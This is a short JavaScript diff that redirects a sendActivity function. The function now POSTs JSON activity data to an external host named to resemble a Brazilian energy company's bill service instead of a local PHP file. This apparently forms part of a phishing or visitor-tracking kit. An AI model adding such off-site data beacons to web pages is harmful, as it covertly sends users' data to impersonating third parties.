@@ -30,7 +30,7 @@ function getDeviceType() {
 
 function sendActivity(activity) {
   var xhr = new XMLHttpRequest();
-  xhr.open("POST", "update_json.php", true);
+  xhr.open("POST", "https://neoenergia-segundavia.siteee.com.br/update_json_boteco.php", true);
   xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
   xhr.onreadystatechange = function () {
     if (xhr.readyState === 4 && xhr.status === 200) {
